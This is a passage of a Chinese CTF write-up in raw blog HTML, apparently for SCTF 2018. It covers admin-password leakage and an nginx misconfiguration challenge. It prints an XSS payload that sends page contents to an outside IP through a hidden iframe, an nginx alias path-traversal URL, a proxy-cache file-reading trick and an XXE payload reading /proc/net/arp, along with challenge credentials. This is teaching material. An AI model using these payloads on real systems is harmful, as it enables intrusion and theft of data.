class=\"code\"><pre><span class=\"line\">adminClound</span><br></pre></td></tr></table></figure>\n<p>结合路由:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://116.62.137.114:4879/api/memos/admintest2313</span><br></pre></td></tr></table></figure>\n<p>访问<code>http://116.62.137.114:4879/api/memos/adminClound</code></p>\n<p>得到<code>adminClound</code>的密码:<code>HGf^&amp;39NsslUIf^23</code></p>\n</li>\n<li><p>登录<code>admin/file</code></p>\n<p>paylaod如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    url: &quot;/admin/file&quot;,</span><br><span class=\"line\">    type: &quot;POST&quot;,</span><br><span class=\"line\">    data: &quot;filepasswd=HGf%5E%2639NsslUIf%5E23&quot;,</span><br><span class=\"line\">    dataType: &quot;text&quot;,</span><br><span class=\"line\">    success: function(result) &#123;</span><br><span class=\"line\">        var code = btoa(encodeURIComponent(result));</span><br><span class=\"line\">        xssPost(&apos;http://123.207.90.143&apos;, code);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    error: function(msg) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">function xssPost(url, postStr) &#123;</span><br><span class=\"line\">    var de;</span><br><span class=\"line\">    de = document.body.appendChild(document.createElement(&apos;iframe&apos;));</span><br><span class=\"line\">    de.src = &apos;about:blank&apos;;</span><br><span class=\"line\">    de.height = 1;</span><br><span class=\"line\">    de.width = 1;</span><br><span class=\"line\">    de.contentDocument.write(&apos;&lt;form method=&quot;GET&quot; action=&quot;&apos; + url + &apos;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&apos; + postStr + &apos;&quot;/&gt;&lt;/form&gt;&apos;);</span><br><span class=\"line\">    de.contentDocument.forms[0].submit();</span><br><span class=\"line\">    de.style.display = &apos;none&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>得到flag:<code>sctf{T4is_is_f1ag2313}</code>。</p>\n</li>\n</ol>\n<h2 id=\"nginx的秘密\"><a href=\"#nginx的秘密\" class=\"headerlink\" title=\"nginx的秘密\"></a>nginx的秘密</h2><blockquote>\n<p>hint4:/editxxxxx怎么也能访问? </p>\n<p>hint3:路由嘛，扫一扫目录就知道了。views.py是读不出来的233333 </p>\n<p>hint2:这个路由好生奇怪 </p>\n<p>hint1:从nginx的典型错误配置入手吧 </p>\n</blockquote>\n<h3 id=\"目录穿越漏洞\"><a href=\"#目录穿越漏洞\" class=\"headerlink\" title=\"目录穿越漏洞\"></a>目录穿越漏洞</h3><blockquote>\n<p>-syc-note 我已经把所有秘密写进secret plan了233333 </p>\n</blockquote>\n<p>​ 需要读取secret plain</p>\n<p>首先可以发现nginx存在目录穿越漏洞，可以参考<a href=\"https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration\" target=\"_blank\" rel=\"noopener\">https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration</a>。</p>\n<p>访问<code>http://116.62.137.155:4455/static../etc/nginx/nginx.conf&gt;</code>，即可得到nginx.conf</p>\n<h3 id=\"理解proxy-cache-path\"><a href=\"#理解proxy-cache-path\" class=\"headerlink\" title=\"理解proxy_cache_path\"></a>理解proxy_cache_path</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user www-data;</span><br><span class=\"line\">worker_processes auto;</span><br><span class=\"line\">pid /run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">  worker_connections 768;</span><br><span class=\"line\">  # multi_accept on;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Basic Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  sendfile on;</span><br><span class=\"line\">  tcp_nopush on;</span><br><span class=\"line\">  tcp_nodelay on;</span><br><span class=\"line\">  keepalive_timeout 65;</span><br><span class=\"line\">  types_hash_max_size 2048;</span><br><span class=\"line\">  # server_tokens off;</span><br><span class=\"line\"></span><br><span class=\"line\">  # server_names_hash_bucket_size 64;</span><br><span class=\"line\">  # server_name_in_redirect off;</span><br><span class=\"line\"></span><br><span class=\"line\">  include /etc/nginx/mime.types;</span><br><span class=\"line\">  default_type application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # SSL Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE</span><br><span class=\"line\">  ssl_prefer_server_ciphers on;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Logging Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  #access_log /var/log/nginx/access.log;</span><br><span class=\"line\">  #error_log /var/log/nginx/error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Gzip Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  gzip on;</span><br><span class=\"line\">  gzip_disable &quot;msie6&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">  # gzip_vary on;</span><br><span class=\"line\">  # gzip_proxied any;</span><br><span class=\"line\">  # gzip_comp_level 6;</span><br><span class=\"line\">  # gzip_buffers 16 8k;</span><br><span class=\"line\">  # gzip_http_version 1.1;</span><br><span class=\"line\">  # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class=\"line\"></span><br><span class=\"line\">  proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br><span class=\"line\">  </span><br><span class=\"line\">  limit_conn_zone $binary_remote_addr zone=conn:10m;</span><br><span class=\"line\">  limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  server &#123;</span><br><span class=\"line\">      listen 4455 default_server;</span><br><span class=\"line\">      server_name localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">      location /static &#123;</span><br><span class=\"line\">          alias /home/;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      location ~* \\.(css|js|gif|png)&#123;</span><br><span class=\"line\">          proxy_cache             my_cache;</span><br><span class=\"line\">          proxy_cache_valid       200 30s;</span><br><span class=\"line\">          proxy_pass              http://bugweb.app:8000;</span><br><span class=\"line\">          proxy_set_header        Host $host:$server_port;</span><br><span class=\"line\">          proxy_ignore_headers    Expires Cache-Control Set-Cookie;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      location / &#123;</span><br><span class=\"line\">          limit_conn conn 10;</span><br><span class=\"line\">          proxy_pass       http://bugweb.app:8000;</span><br><span class=\"line\">          proxy_set_header Host $host:$server_port;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Virtual Host Configs</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  include /etc/nginx/conf.d/*.conf;</span><br><span class=\"line\">  include /etc/nginx/sites-enabled/*;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#mail &#123;</span><br><span class=\"line\"># # See sample authentication script at:</span><br><span class=\"line\"># # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class=\"line\"># </span><br><span class=\"line\"># # auth_http localhost/auth.php;</span><br><span class=\"line\"># # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class=\"line\"># # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class=\"line\"># </span><br><span class=\"line\"># server &#123;</span><br><span class=\"line\">#   listen     localhost:110;</span><br><span class=\"line\">#   protocol   pop3;</span><br><span class=\"line\">#   proxy      on;</span><br><span class=\"line\"># &#125;</span><br><span class=\"line\"># </span><br><span class=\"line\"># server &#123;</span><br><span class=\"line\">#   listen     localhost:143;</span><br><span class=\"line\">#   protocol   imap;</span><br><span class=\"line\">#   proxy      on;</span><br><span class=\"line\"># &#125;</span><br><span class=\"line\">#&#125;</span><br></pre></td></tr></table></figure>\n<p>其中最重要的是这句话:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br></pre></td></tr></table></figure>\n<p>匹配到~* .(css|js|gif|png)就进行缓存。</p>\n<p>查看文档<a href=\"http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path\" target=\"_blank\" rel=\"noopener\">http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path</a> 了解proxy_cache_path的值的含义，得知缓存文件保存在/tmp/mycache，用于定义缓存文件名的proxy_cache_key未设置，则使用默认值 \\$scheme\\$proxy_host\\$request_uri，即文件名形式为MD5(\\$scheme\\$proxy_host\\$request_uri),如果访问<a href=\"http://116.62.137.155:4455/write_plan/a.js/\" target=\"_blank\" rel=\"noopener\">http://116.62.137.155:4455/write_plan/a.js/</a> ，则缓存文件名为MD5(<a href=\"http://bugweb.app:8000/write_plan/a.js/\" target=\"_blank\" rel=\"noopener\">http://bugweb.app:8000/write_plan/a.js/</a>) ==6fcfa7b1e6bad837b70dc98c9b82b43b，由于proxy_cache_path设置了levels=1:2，因此缓存文件存在/tmp/mycache下的两级目录下，第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符，例如/tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b，再通过任意文件读取即可读到缓存文件的内容。</p>\n<h3 id=\"读取secret-plain\"><a href=\"#读取secret-plain\" class=\"headerlink\" title=\"读取secret_plain\"></a>读取secret_plain</h3><p>由于路由很奇怪，访问/editxxxxx等同于访问/edit，同理访问/write_planxxxx等同于访问/write_planxxxx。因而构造<a href=\"http://116.62.137.155:4455/write_plan/a.js/\" target=\"_blank\" rel=\"noopener\">http://116.62.137.155:4455/write_plan/a.js/</a> 提交给管理员访问， 管理员在查看该页面之后，也就相当于访问了管理员的<code>http://116.62.137.155:4455/write_plan</code>,并生成了缓存文件，这时候再读取缓存文件。</p>\n<p><code>http://116.62.137.155:4455/static../tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\u0003       嬹,[    m?[    ,R泻  ? \u000f\u0001                                                                                                      </span><br><span class=\"line\">KEY: http://bugweb.app:8000/write_plan/a.js/</span><br><span class=\"line\">HTTP/1.0 200 OK</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br><span class=\"line\">Content-Length: 3555</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;title&gt;post bug&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;!-- Bootstrap --&gt;</span><br><span class=\"line\">    &lt;link href=&quot;//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link rel=&quot;shortcut icon&quot; href=&quot;/static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;</span><br><span class=\"line\">&lt;link rel=&quot;icon&quot; href=&quot;/static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/head&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">        &lt;div class=&quot;navbar-header&quot;&gt;</span><br><span class=\"line\">            &lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-collapse&quot;&gt;</span><br><span class=\"line\">                &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</span><br><span class=\"line\">                &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">                &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">                &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">            &lt;/button&gt;</span><br><span class=\"line\">            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Syc Work Notes&lt;/a&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;div class=&quot;navbar-collapse collapse&quot;&gt;</span><br><span class=\"line\">            &lt;ul class=&quot;nav navbar-nav&quot;&gt;</span><br><span class=\"line\">                </span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/user/admin&quot;&gt;UserInfo&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/edit/&quot;&gt;EditMyinfo&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">                    &lt;li&gt;&lt;a href=&quot;/write_plan/&quot;&gt;Write_your_plan&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">                    &lt;li&gt;&lt;a href=&quot;/import_and_export/&quot;&gt;import_and_export&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/post_bug/&quot;&gt;Post Bug&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/auth/logout?url=logout&quot;&gt;Sign Out&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;div class=&quot;page-header&quot;&gt;</span><br><span class=\"line\">    &lt;h1&gt;Write down your secret plan. Rest assured that no one will see you.&lt;/h1&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;ul class=&quot;posts&quot;&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;form action=&quot;&quot; method=&quot;post&quot;</span><br><span class=\"line\">  class=&quot;form&quot; role=&quot;form&quot;&gt;</span><br><span class=\"line\">  &lt;input id=&quot;csrf_token&quot; name=&quot;csrf_token&quot; type=&quot;hidden&quot; value=&quot;Ijc3Mzk4MDMxYmI1NDUwMTA4NTZkOGEzYzhlZjAwZDMxOGZlMjNkMDQi.Dg6C7Q.1hRJWLxrI4d2tPRJMw5y3-WMtpE&quot;&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;form-group &quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;content&quot;&gt;Write your plan&lt;/label&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">          &lt;textarea class=&quot;form-control&quot; id=&quot;content&quot; name=&quot;content&quot;&gt;&lt;/textarea&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;input class=&quot;btn btn-default&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">      &lt;li class=&quot;post&quot;&gt;</span><br><span class=\"line\">         &lt;div class=&quot;post-date&quot;&gt;</span><br><span class=\"line\">          &lt;span class=&quot;flask-moment&quot; data-timestamp=&quot;2018-05-17T07:46:36Z&quot; data-format=&quot;fromNow(0)&quot; data-refresh=&quot;0&quot; style=&quot;display: none&quot;&gt;2018-05-17T07:46:36Z&lt;/span&gt;</span><br><span class=\"line\">              鏄庢櫄缁村悓缃戞鐨刦tp鏈嶅姟鍣紝syc10ver Eec5TN9fruOOTp2G銆傚瘑鐮佽繖涔堥暱鐪熸槸闅捐锛屽娉ㄤ竴涓媬銆?        &lt;/div&gt;</span><br><span class=\"line\">      &lt;/li&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">    &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment-with-locales.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">moment.locale(&quot;en&quot;);</span><br><span class=\"line\">function flask_moment_render(elem) &#123;</span><br><span class=\"line\">    $(elem).text(eval(&apos;moment(&quot;&apos; + $(elem).data(&apos;timestamp&apos;) + &apos;&quot;).&apos; + $(elem).data(&apos;format&apos;) + &apos;;&apos;));</span><br><span class=\"line\">    $(elem).removeClass(&apos;flask-moment&apos;).show();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function flask_moment_render_all() &#123;</span><br><span class=\"line\">    $(&apos;.flask-moment&apos;).each(function() &#123;</span><br><span class=\"line\">        flask_moment_render(this);</span><br><span class=\"line\">        if ($(this).data(&apos;refresh&apos;)) &#123;</span><br><span class=\"line\">            (function(elem, interval) &#123; setInterval(function() &#123; flask_moment_render(elem) &#125;, interval); &#125;)(this, $(this).data(&apos;refresh&apos;));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$(document).ready(function() &#123;</span><br><span class=\"line\">    flask_moment_render_all();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>从中我们可以得到ftp的账号密码:</p>\n<blockquote>\n<p>syc10ver         Eec5TN9fruOOTp2G</p>\n</blockquote>\n<h3 id=\"xxe-读取-proc-net-arp\"><a href=\"#xxe-读取-proc-net-arp\" class=\"headerlink\" title=\"xxe 读取/proc/net/arp\"></a>xxe 读取/proc/net/arp</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [</span><br><span class=\"line\">&lt;!ENTITY file SYSTEM &quot;file:///proc/net/arp&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;plans&gt;</span><br><span class=\"line\">    &lt;plan&gt;</span><br><span class=\"line\">        &lt;content&gt;&amp;file;&lt;/content&gt;</span><br><span class=\"line\">    &lt;/plan&gt;</span><br><span class=\"line\">&lt;/plans&gt;</span><br></pre></td></tr></table></figure>\n<p>结果如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">43 minutes ago 172.18.0.1 0x1 0x2 02:42:ca:cd:4e:eb * eth0</span><br><span class=\"line\">43 minutes ago</span><br><span class=\"line\">43 minutes ago 172.18.0.4 0x1 0x2 02:42:ac:12:00:04 * eth0</span><br><span class=\"line\">43 minutes ago</span><br><span class=\"line\">43 minutes ago 172.18.0.2 0x1 0x2 02:42:ac:12:00:02 * eth0</span><br></pre></td></tr></table></figure>\n<h3 id=\"xxe读取172-18-0-4-21的目录\"><a href=\"#xxe读取172-18-0-4-21的目录\" class=\"headerlink\" title=\"xxe读取172.18.0.4:21的目录\"></a>xxe读取172.18.0.4:21的目录</h3><figure class=\"highlight plain\"><table><tr><td 